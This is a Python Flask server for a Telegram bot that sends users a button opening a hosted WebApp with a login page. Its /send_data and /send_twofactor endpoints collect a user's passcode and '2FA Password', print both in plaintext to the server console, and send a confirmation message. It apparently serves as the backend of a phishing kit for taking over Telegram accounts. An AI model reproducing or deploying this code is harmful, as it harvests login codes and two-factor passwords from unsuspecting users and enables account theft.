from flask import Flask, request, jsonify, render_template
import requests
import os

app = Flask(__name__)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# === Telegram Webhook ===
@app.route("/", methods=["POST"])
def webhook():
    update = request.get_json(force=True, silent=True)
    print(update, flush=True)

    if not update or "message" not in update:
        return jsonify({"ok": True})

    chat_id = update["message"]["chat"]["id"]
    text = update["message"].get("text", "")

    if text == "/start":
        webapp_url = "https://tgbot-gllp.onrender.com/webapp"
        keyboard = {
            "inline_keyboard": [[{
                "text": "🌐 Open WebApp",
                "web_app": {"url": webapp_url}
            }]]
        }

        requests.post(f"{TELEGRAM_API}/sendMessage", json={
            "chat_id": chat_id,
            "text": "Tap below to open the WebApp 👇",
            "reply_markup": keyboard
        })

    return jsonify({"ok": True})


# === WebApp UI ===
@app.route("/webapp")
def webapp():
    return render_template("index.html")

@app.route('/login')
def login_screen():
    return render_template('login.html')

# === Receive data from WebApp ===
@app.route("/send_data", methods=["POST"])
def send_data():
    data = request.get_json()
    
    # Print received data to console
    print("=" * 50, flush=True)
    print("📨 Received from webapp:", flush=True)
    print(f"   User ID: {data.get('user_id')}", flush=True)
    print(f"   Passcode: {data.get('passcode')}", flush=True)
    print(f"   Full data: {data}", flush=True)
    print("=" * 50, flush=True)

    user_id = data.get("user_id")
    passcode = data.get("passcode")

    # Optionally send a message back to the user via Telegram
    if user_id and passcode:
        try:
            requests.post(f"{TELEGRAM_API}/sendMessage", json={
                "chat_id": user_id,
                "text": f"✅ Received your passcode: {passcode}"
            })
        except Exception as e:
            print(f"❌ Error sending Telegram message: {e}", flush=True)

    return jsonify({"ok": True, "status": "received"})


# === Receive 2FA data from WebApp ===
@app.route("/send_twofactor", methods=["POST"])
def send_twofactor():
    data = request.get_json()
    
    # Print received data to console
    print("=" * 50, flush=True)
    print("🔐 Received 2FA from webapp:", flush=True)
    print(f"   User ID: {data.get('user_id')}", flush=True)
    print(f"   2FA Password: {data.get('twofactor')}", flush=True)
    print(f"   Full data: {data}", flush=True)
    print("=" * 50, flush=True)

    user_id = data.get("user_id")
    twofactor = data.get("twofactor")

    # Optionally send a message back to the user via Telegram
    if user_id and twofactor:
        try:
            requests.post(f"{TELEGRAM_API}/sendMessage", json={
                "chat_id": user_id,
                "text": f"🔐 Received your 2FA password"
            })
        except Exception as e:
            print(f"❌ Error sending Telegram message: {e}", flush=True)

    return jsonify({"ok": True, "status": "received"})


@app.route("/status")
def index():
    return "✅ Telegram bot server running fine."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))